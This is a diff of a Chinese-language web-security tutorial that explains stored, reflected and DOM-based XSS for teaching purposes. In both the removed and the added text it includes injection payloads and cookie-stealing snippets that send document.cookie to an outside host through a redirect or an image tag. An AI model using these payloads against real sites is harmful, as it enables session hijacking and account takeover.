@@ -8,34 +8,34 @@ tags:
 
 XSS 的全称是 Cross Site Scripting，为了避免同 CSS 的缩写重复所以用了 XSS 代替，相比于上一篇介绍的 CSRF 攻击，XSS 攻击的威力更大，它可以直接在用户当前正在浏览的页面运行自定义的 javascript 脚本，操作得当的话可以污染浏览这个页面的所有用户。
 
-XSS 最主要的方式是通过服务端没有对用户上传的内容进行 编码/过滤，然后直接返回给客户端并展示在 HTML 上，客户端也直接输出了响应内容没有做过滤，这时内容的上传者就可以发起 XSS 攻击了。原理如下图：
+XSS 主要分为三类：存储型、反射型和 DOM 型（目前主流是前后端分离，反射型不如 DOM 型常见），下面我们依次了解一下每种攻击方式有何不同。
 
-![xss](http://oiw32lugp.qnssl.com/2017-07-15-xss.png)
-
-假设网站有一个评论的功能，评论内容会被上传到服务器并被所有浏览该文章的用户看到，某个用户上传了这样的内容：
-
-```js
-<script>location.href="//shijianan.com/?c=" + document.cookie</script>
-```
-
-这个评论上传后在客户端被渲染成
+## 存储型
+比起存储型这个更为广泛的叫法，持久型跨站脚本（Persistent Cross-Site Scripting）相对来说更贴切一些，这类攻击通常发生在用户生成内容的地方（UGC）比如评论、博客之类的，由于用户输入被存储在了数据库，每个浏览到恶意输入的用户都可能中招，举个例子：
 
 ```html
-<p><script>location.href="//shijianan.com/?c=" + document.cookie</script></p>
+// 以模版的形式展示用户评论
+<div><%= comment %></div>
 ```
 
-那么所有浏览这个页面的用户都将被跳往 `shijianan.com` 并且携带上他们当前作用域的 Cookie，如果这个网站不幸通过 Cookie 管理用户登录状态，那么接下来我就可以登录它的账号了，想想也是挺可怕的。
+假设用户的评论内容是：`</div><script>alert('xss')</script><div>` 那么例子中的 `div` 会侧漏导致浏览这个页面的用户的浏览器都会执行 script 中的内容。
 
-原理说完了，那么我们要如何防范这种攻击呢？相比于 CSRF，XSS 攻击的角度更多，影响更大，攻击者甚至可以再上传图片时在图片 url 中通过提前闭合标签的方式发起攻击。不过正如上文提到的，只有满足服务端不 编码/过滤，客户端也不 编码/过滤 两个条件时才可以实施。
+## 反射型和 DOM 型
+这两类我们放在一起说，反射型 XSS 依赖用户操作，通常发生在页面需要直接使用 url 参数的地方，比如搜索页面，如果对 url 中的参数未加以防范很容易中招，举个例子：
 
-1. 永远不要相信用户的输入
-2. 转义 html 标签（客户端）
+```html
+<div>您搜索的<%= query %>不存在</div>
+```
 
-| 标签名 | 转义 |
-|  — | — |
-| < | &lt; |
-| > | &gt; |
-| & | &amp; |
-| “ | &quot |
+攻击者伪造的 url：`https://shijianan.com?query="</div><script>alert('xss')</script>` 原理类似前面提到的存储型攻击，但是相对攻击范围较小，因此攻击者通常需要各种方式引诱用户点击恶意链接。
 
-单引号就不需要处理了，因为 html 属性中用到的都是双引号，还有一种高端的通过 ASCII code 发起攻击的方式，看网上的防御方式普遍是转换成 &#<number> 的形式。
+DOM 型则是基于前端的，如果直接用 innerHTML、document.write 这类 API 的时候对用户输入不加以防范容易出现这类 XSS 攻击，举个例子：
+
+```js
+comment = '<image src="https://shijianan.com?cookie=' + document.cookie + '" />';
+const c = document.querySelector('comment');
+c.innerHTML = comment;
+```
+
+通过注入一个 image 标签将用户的 cookie 就会被发送到指定页面了，因此我们在使用 vue 之类的框架的时候都会明确警示我们相关风险。
+
